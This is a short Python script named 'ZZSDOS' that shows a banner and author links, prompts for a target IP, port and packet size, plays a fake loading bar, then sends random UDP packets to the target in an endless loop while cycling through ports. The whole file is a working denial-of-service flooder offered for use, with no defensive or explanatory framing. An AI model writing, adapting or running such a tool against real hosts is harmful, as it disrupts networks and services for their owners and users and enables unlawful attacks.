import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("@@@@@ @@@@@  @@@@ @@@@   @@@   @@@@")
print("   @     @  @     @   @ @   @ @")
print("  @     @    @@@  @   @ @   @  @@@")
print(" @     @        @ @   @ @   @     @")
print("@@@@@ @@@@@ @@@@  @@@@   @@@  @@@@")
print("")
print("This is ZZSDOS")
print("Version V1.0 Bata 2")
print("Github: https://github.com/ZhonZhouShe")
print("BiliBili: https://space.bilibili.com/1138680362")
print("")
ip = input("IP: ")
port = input("Port: ")
port = int(port)
btt = input("Packet: ")
bytes = random._urandom(int(btt))
print("Laoding...")
time.sleep(1)
print("[                    ] 0% ")
time.sleep(7)
print("[=====               ] 25%")
time.sleep(6)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(4)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("send %s packet to %s This is %s"%(sent,ip,port))
     if port == 65532:
       port = 1


